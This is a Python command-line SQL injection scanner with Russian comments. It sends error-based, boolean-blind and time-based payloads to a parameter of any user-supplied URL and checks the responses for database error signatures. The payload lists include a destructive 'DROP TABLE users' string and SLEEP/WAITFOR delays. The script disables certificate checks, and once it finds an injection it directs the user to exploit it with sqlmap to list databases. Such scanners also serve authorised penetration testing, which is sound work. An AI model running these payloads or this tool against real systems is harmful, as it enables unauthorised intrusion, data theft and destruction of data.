#!/usr/bin/env python3
import requests
import time
import argparse
import difflib
import sys
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import warnings
warnings.filterwarnings("ignore")
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
# ── Error-based payloads
───────────────────────────────────────────────────────
ERROR_PAYLOADS = [
"'", '"', "\\", "';",
"' OR '1'='1", "\" OR \"1\"=\"1",
"' OR 1=1--", "' OR 1=1#",
"1; DROP TABLE users--",
"' UNION SELECT NULL--",
"1' AND 1=CONVERT(int, 'x')--",
]
# ── Сигнатуры ошибок БД
────────────────────────────────────────────────────────
DB_ERROR_SIGNATURES = {
"MySQL": ["you have an error in your sql", "warning: mysql", "mysql_fetch",
"supplied argument is not a valid mysql"],
"PostgreSQL": ["pg_query", "pg_exec", "postgresql", "unterminated quoted
string"],
"MSSQL": ["microsoft sql server", "unclosed quotation mark", "incorrect
syntax near"],
"Oracle": ["ora-", "oracle error", "ociexecute", "quoted string not properly
terminated"],
"SQLite": ["sqlite3", "sqlite_master", "no such column"],
"Generic": ["sql syntax", "syntax error", "database error", "query failed",
"db error", "odbc", "jdbc"],
}
# ── Boolean-based payloads (TRUE/FALSE пары)
───────────────────────────────────
BOOLEAN_PAYLOADS = [
("' AND '1'='1", "' AND '1'='2"), # Строковый контекст
(" AND 1=1", " AND 1=2"),
 
(" AND 1=1--", " AND 1=2--"),

("' AND 1=1--", "' AND 1=2--"),
(") AND 1=1--", ") AND 1=2--"),
 # Скобочный контекст
]
TIME_PAYLOADS = [
"' OR SLEEP(5)--",
 # MySQL
"'; WAITFOR DELAY '0:0:5'--",
 # MSSQL
"' OR pg_sleep(5)--",
 # PostgreSQL
"'; SELECT SLEEP(5)--",
"1 AND SLEEP(5)",
"' AND 1=1 AND SLEEP(5)--",
"1; SELECT 1 FROM (SELECT SLEEP(5))a--",
]
HEADERS = {
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}
class SQLiDetector:
def __init__(self, url: str, method: str, params: dict,
target_param: str, timeout: float = 10):
self.url
 = url
self.method
 = method.upper()
self.params
 = params.copy()
self.target_param = target_param
self.timeout = timeout
self.session = requests.Session()
self.session.headers.update(HEADERS)
self.baseline_len = 0
self.baseline_text = ""
def _send(self, payload_value: str) -> tuple[int, str, float]:
params = self.params.copy()
params[self.target_param] = payload_value
start = time.time()
try:
if self.method == "GET":
resp = self.session.get(self.url, params=params,
timeout=self.timeout, verify=False)
else:
resp = self.session.post(self.url, data=params,
timeout=self.timeout, verify=False)
elapsed = time.time() - start
return (resp.status_code, resp.text, elapsed)
except requests.exceptions.Timeout:
return (0, "", self.timeout)
except Exception:
return (0, "", 0)
def get_baseline(self) -> None:
original_val = self.params.get(self.target_param, "1")
_, text, _ = self._send(original_val)
self.baseline_text = text
self.baseline_len = len(text)
def detect_error_based(self) -> list[dict]:
findings = []
for payload in ERROR_PAYLOADS:
injected = self.params.get(self.target_param, "1") + payload
status, body, _ = self._send(injected)
body_lower = body.lower()
for db_type, signatures in DB_ERROR_SIGNATURES.items():
for sig in signatures:
if sig in body_lower:
findings.append({
"method": "Error-based",
"db": db_type,
"payload": payload,
"evidence": sig,
})
print(f" {GREEN}[VULN] Error-based SQLi! "
f"DB: {db_type} | Payload: {payload!r}{RESET}")
print(f"
 Evidence: '{sig}' found in response")
return findings # Нашли — достаточно
return findings
def detect_boolean_based(self) -> list[dict]:
"""Сравниваем ответы для TRUE и FALSE условий."""
findings = []
for true_payload, false_payload in BOOLEAN_PAYLOADS:
base_val = self.params.get(self.target_param, "1")
_, true_body, _ = self._send(base_val + true_payload)
_, false_body, _ = self._send(base_val + false_payload)
# Сходство: 1.0 = идентичны, 0.0 = полностью разные
similarity = difflib.SequenceMatcher(
None, true_body, false_body
).ratio()
true_len = len(true_body)
false_len = len(false_body)
base_len = self.baseline_len
if (abs(true_len - base_len) < 50 and
abs(true_len - false_len) > 100 and
similarity < 0.90):
findings.append({
"method": "Boolean-based blind",
"true_len": true_len,
"false_len": false_len,
"similarity": round(similarity, 3),
"payload": true_payload,
})
print(f" {GREEN}[VULN] Boolean-based SQLi! "
f"Payload: {true_payload!r}{RESET}")
print(f"
 TRUE len={true_len}, FALSE len={false_len}, "
f"similarity={similarity:.3f}")
return findings
return findings
def detect_time_based(self) -> list[dict]:
THRESHOLD = 4.0 # Считаем уязвимым если задержка > 4 сек
findings = []
for payload in TIME_PAYLOADS:
base_val = self.params.get(self.target_param, "1")
_, _, elapsed = self._send(base_val + payload)
if elapsed >= THRESHOLD:
findings.append({
"method": "Time-based blind",
"payload": payload,
"delay": round(elapsed, 2),
})
print(f" {GREEN}[VULN] Time-based SQLi! "
f"Payload: {payload!r} → Задержка: {elapsed:.2f}s{RESET}")
return findings
return findings
def run(self) -> list[dict]:
print(f"{CYAN}[*] Цель: {self.url}{RESET}")
print(f"{CYAN}[*] Метод: {self.method}{RESET}")
print(f"{CYAN}[*] Параметр: {self.target_param}{RESET}")
print("-" * 60)
self.get_baseline()
print(f"{CYAN}[*] Baseline: {self.baseline_len} байт{RESET}\n")
all_findings = []
print(f"{YELLOW}[*] Тест 1: Error-based...{RESET}")
all_findings += self.detect_error_based()
print(f"{YELLOW}[*] Тест 2: Boolean-based blind...{RESET}")
all_findings += self.detect_boolean_based()
print(f"{YELLOW}[*] Тест 3: Time-based blind (медленно)...{RESET}")
all_findings += self.detect_time_based()
if not all_findings:
print(f"\n{RED}[-] SQLi не обнаружена в параметре
'{self.target_param}'{RESET}")
else:
print(f"\n{GREEN}[✓] Найдено {len(all_findings)} потенциальных
SQLi!{RESET}")
print(f"{YELLOW}[!] Для эксплуатации используй sqlmap с
параметром:{RESET}")
print(f" sqlmap -u \"{self.url}\" --param {self.target_param} --dbs")
return all_findings
def parse_post_data(data_str: str) -> dict:
result = {}
for pair in data_str.split("&"):
if "=" in pair:
k, v = pair.split("=", 1)
result[k] = v
return result
def main():
parser = argparse.ArgumentParser(description="SQL Injection Detector")
parser.add_argument("-u", "--url", required=True, help="Целевой URL")
parser.add_argument("-p", "--param", required=True, help="Тестируемый
параметр")
parser.add_argument("-m", "--method", default="GET", choices=["GET",
"POST"],
help="HTTP метод")
parser.add_argument("-d", "--data", default=None,
help="POST данные: 'param1=val1&param2=val2'")
parser.add_argument("--timeout", type=float, default=10,
help="Таймаут запроса")
args = parser.parse_args()
# Разбираем параметры
if args.method == "GET":
parsed = urlparse(args.url)
params = parse_qs(parsed.query, keep_blank_values=True)
params = {k: v[0] for k, v in params.items()}
clean_url = urlunparse(parsed._replace(query=""))
else:
params = parse_post_data(args.data or "")
clean_url = args.url
if args.param not in params:
params[args.param] = "1"
detector = SQLiDetector(clean_url, args.method, params,
args.param, args.timeout)
detector.run()
if __name__ == "__main__":
main()
